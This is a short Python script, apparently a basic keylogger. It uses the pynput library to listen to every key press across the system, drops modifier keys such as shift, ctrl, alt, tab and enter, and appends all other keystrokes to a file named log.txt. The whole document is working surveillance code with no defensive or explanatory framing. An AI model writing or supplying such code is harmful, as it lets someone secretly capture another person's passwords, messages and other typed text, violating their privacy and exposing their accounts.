from pynput import keyboard


f = open("log.txt","a+")

def keyCS(key):
    character=str(key)
    character=character.replace("'","")
    if(character=='Key.tab'):
        character=""
    if(character == "Key.caps_lock"):
        character=""
    if(character=='Key.shift'):
        character=""
    if(character=="Key.ctrl"):
        character=""
    if(character=="Key.alt"):
        character=""
    if(character=="Key.alt_r"):
        character=""
    if(character=="Key.ctrl_r"):
        character=""
    if(character=="Key.right"):
        character=""
    if(character=="Key.shift_r"):
        character=""
    if(character=="Key.enter"):
        character=""
    if(character=="Key.esc"):
        character=""
    if(character=="Key.cmd"):
        character=""
    f.write(character)

with keyboard.Listener(on_press=keyCS) as listener:
    listener.join()
